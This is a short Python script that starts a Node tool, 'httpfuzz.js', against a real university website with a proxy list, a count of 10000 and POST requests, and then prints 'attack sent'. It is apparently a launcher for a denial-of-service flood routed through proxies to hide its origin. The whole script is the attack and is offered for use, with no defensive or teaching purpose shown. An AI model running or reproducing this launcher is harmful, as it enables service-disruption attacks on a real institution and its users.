import subprocess

subprocess.Popen(["node", "httpfuzz.js", "https://www.iitb.ac.in", "proxy.txt", "10000", "POST"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
print("attack sent")
